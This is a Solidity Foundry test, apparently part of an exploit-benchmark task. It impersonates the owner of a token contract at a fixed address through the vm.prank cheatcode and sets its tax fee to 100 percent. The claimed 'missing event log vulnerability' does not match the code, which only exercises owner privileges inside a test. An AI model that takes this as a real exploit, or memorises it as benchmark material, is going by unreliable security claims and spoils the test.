// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface Plenty {
    function owner() external view returns (address);
    function setTaxFeePercent(uint256 taxFee) external;
    function _taxFee() external view returns (uint256);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed for this exploit
        // The test file already defines TARGET and attacker
        // We just need to get the owner address
        address owner = Plenty(TARGET).owner();
        vm.label(owner, "Contract Owner");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Step 1: Get the current owner
        address owner = Plenty(TARGET).owner();

        // Step 2: Impersonate the owner and call setTaxFeePercent(100)
        vm.prank(owner);
        Plenty(TARGET).setTaxFeePercent(100);

        // Step 3: Verify the tax fee was changed to 100
        uint256 newTaxFee = Plenty(TARGET)._taxFee();
        require(newTaxFee == 100, "Tax fee not set to 100%");

        // The oracle will check that Plenty._taxFee == 100
        // This demonstrates the missing event log vulnerability
        assertEq(newTaxFee, 100, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

